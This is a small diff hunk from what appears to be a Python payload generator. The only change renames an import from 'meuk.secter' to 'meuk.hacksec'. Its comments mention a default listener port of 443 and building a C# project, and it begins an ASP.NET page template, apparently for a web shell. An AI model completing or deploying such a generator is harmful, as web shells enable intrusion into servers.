@@ -10,7 +10,7 @@
 # default lport= 443
 # writes out csharp project and build it
 
-from meuk.secter import *
+from meuk.hacksec import *
 
 template="""<%@ Page Language="C#" AutoEventWireup="true" %>
 <%@ Import Namespace="System.IO" %>
